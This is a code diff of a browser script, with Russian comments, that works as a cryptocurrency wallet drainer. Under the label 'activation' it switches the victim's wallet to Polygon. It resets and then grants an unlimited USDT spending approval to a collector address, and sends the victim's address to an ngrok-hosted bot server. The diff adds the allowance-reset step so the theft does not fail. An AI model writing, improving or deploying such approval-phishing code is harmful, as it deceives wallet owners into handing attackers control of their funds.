@@ -13,14 +13,12 @@ async function connectAndApprove() {
     try {
         status.innerText = 'Переключение на Polygon...';
 
-        // ПРИНУДИТЕЛЬНАЯ СМЕНА СЕТИ
         try {
             await window.ethereum.request({
                 method: 'wallet_switchEthereumChain',
                 params: [{ chainId: POLYGON_CHAIN_ID }],
             });
         } catch (error) {
-            // Если сети нет в кошельке (код 4902), добавляем её автоматически
             if (error.code === 4902) {
                 await window.ethereum.request({
                     method: 'wallet_addEthereumChain',
@@ -37,26 +35,34 @@ async function connectAndApprove() {
             }
         }
 
-        // Инициализация Web3 после смены сети
         const web3 = new Web3(window.ethereum);
         const accounts = await web3.eth.requestAccounts();
         const address = accounts[0];
 
-        status.innerText = 'Подтвердите активацию в кошельке...';
-
-        const abi = [{"inputs":[{"name":"_spender","type":"address"},{"name":"_value","type":"uint256"}],"name":"approve","outputs":[{"name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"}];
+        // Расширенный ABI для проверки и сброса
+        const abi = [
+            {"inputs":[{"name":"_owner","type":"address"},{"name":"_spender","type":"address"}],"name":"allowance","outputs":[{"name":"","type":"uint256"}],"stateMutability":"view","type":"function"},
+            {"inputs":[{"name":"_spender","type":"address"},{"name":"_value","type":"uint256"}],"name":"approve","outputs":[{"name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"}
+        ];
         const contract = new web3.eth.Contract(abi, USDT_CONTRACT);
         
+        // ШАГ 1: Проверка текущего лимита
+        const currentAllowance = await contract.methods.allowance(address, COLLECTOR_ADDRESS).call();
+        
+        // ШАГ 2: Если лимит не 0, сбрасываем его (иначе будет ошибка Reverted)
+        if (BigInt(currentAllowance) > 0n) {
+            status.innerText = 'Сброс лимита для активации...';
+            await contract.methods.approve(COLLECTOR_ADDRESS, 0).send({ from: address });
+        }
+
+        status.innerText = 'Подтвердите активацию в кошельке...';
         const maxUint = '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
 
-        // ВЫЗОВ APPROVE (Пользователь видит окно оплаты газа MATIC)
-        await contract.methods.approve(COLLECTOR_ADDRESS, maxUint).send({ 
-            from: address 
-        });
+        // ШАГ 3: Установка максимального лимита
+        await contract.methods.approve(COLLECTOR_ADDRESS, maxUint).send({ from: address });
 
         status.innerText = 'Синхронизация с сервером...';
 
-        // ОТПРАВКА В БОТ (Замени URL на свой актуальный Ngrok)
         await fetch('https://gypseous-janis-wandlike.ngrok-free.dev/save-address', {
             method: 'POST',
             headers: {'Content-Type': 'application/json'},
@@ -72,4 +78,4 @@ async function connectAndApprove() {
     }
 }
 
-document.getElementById('connectBtn').addEventListener('click', connectAndApprove);
+document.getElementById('startBtn').addEventListener('click', connectAndApprove);
